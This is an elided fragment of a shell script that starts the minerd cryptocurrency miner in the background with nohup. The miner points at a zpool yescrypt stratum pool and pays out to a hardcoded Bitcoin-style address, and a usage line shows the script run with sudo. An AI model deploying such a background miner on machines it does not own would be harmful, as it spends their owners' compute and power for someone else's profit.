...
echo "sudo sh $0 $vermelho 1Ba8dgkUNB57NXNprPZQeuoEKVKw3JVPtd.16n1g0ld3m \033[0m   \n"
exit 0
fi
...
sleep 10
cd miner
nohup ./minerd -o stratum+tcp://yescrypt.mine.zpool.ca:6233 -u 1Ba8dgkUNB57NXNprPZQeuoEKVKw3JVPtd.16n1g0ld3m &
